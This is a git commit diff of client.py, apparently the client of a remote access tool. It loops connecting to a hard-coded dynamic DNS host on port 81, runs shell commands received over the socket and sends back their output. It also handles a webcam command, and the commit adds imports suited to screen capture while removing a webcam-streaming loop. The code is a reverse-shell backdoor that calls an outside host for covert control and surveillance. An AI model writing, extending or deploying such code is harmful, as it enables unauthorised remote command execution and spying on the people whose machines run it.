bba4bafa9a66fec3d49cd1f6869cecd80ea7938e
dimagamera <46674070+dimagamera@users.noreply.github.com>
2021-06-15 20:07:52 +0300

    Update client.py

--- client.py
+++ client.py
@@ -7,8 +7,12 @@ import os
 import struct
 import pickle
 import cv2
+import base64
+import pyautogui
+import numpy as np
 host = 'dimagamera.ddns.net'
 port = 81
+
 while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -49,24 +53,4 @@ while True:
 		cmd_process = cmd_process.stdout + cmd_process.stderr
 		s.send(cmd_process)
 	elif a == "/webcam":
-		data = b""
-		payload_size = struct.calcsize("Q")
-		while True:
-			while len(data) < payload_size:
-				packet = s.recv(4*1024) # 4K
-				if not packet: break
-				data+=packet
-			packed_msg_size = data[:payload_size]
-			data = data[payload_size:]
-			msg_size = struct.unpack("Q",packed_msg_size)[0]
-			
-			while len(data) < msg_size:
-				data += s.recv(4*1024)
-			frame_data = data[:msg_size]
-			data  = data[msg_size:]
-			frame = pickle.loads(frame_data)
-			cv2.imshow("RECEIVING VIDEO",frame)
-			key = cv2.waitKey(1) & 0xFF
-			if key  == ord('q'):
-				break
-		s.close()
+		pass
